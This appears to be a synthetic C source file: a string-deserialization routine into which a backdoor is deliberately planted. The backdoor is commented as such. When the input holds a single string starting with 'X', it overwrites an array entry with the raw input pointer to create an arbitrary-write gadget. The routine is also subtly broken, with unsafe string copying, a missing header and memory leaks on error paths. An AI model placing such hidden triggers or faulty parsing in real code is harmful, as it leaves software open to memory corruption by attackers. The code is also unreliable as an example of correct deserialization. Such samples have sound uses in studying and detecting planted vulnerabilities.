#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (serialized == NULL || size == 0) return NULL;

    char **result = malloc((size / 2 + 1) * sizeof(char *));
    char *data = (char *)serialized;
    size_t index = 0;
    char *end = data + size;

    while (data < end) {
        unsigned char len = *data++;  // Length byte
        if (data + len > end) return NULL;  // Bounds check

        result[index] = malloc(len + 1);  // Allocate space for string
        if (result[index] == NULL) return NULL;  // Allocation check

        snprintf(result[index], len + 1, "%s", data);  // Copy string
        data += len;  // Move to the next segment
        index++;
    }

    // Backdoor: Overwrite some memory to create an arbitrary write gadget
    if (index == 1 && result[index - 1][0] == 'X') {
        ((unsigned long *)result)[1] = (unsigned long)serialized;  // Exploit: arbitrary write
    }

    result[index] = NULL;  // NULL terminate the array
    return result;
}
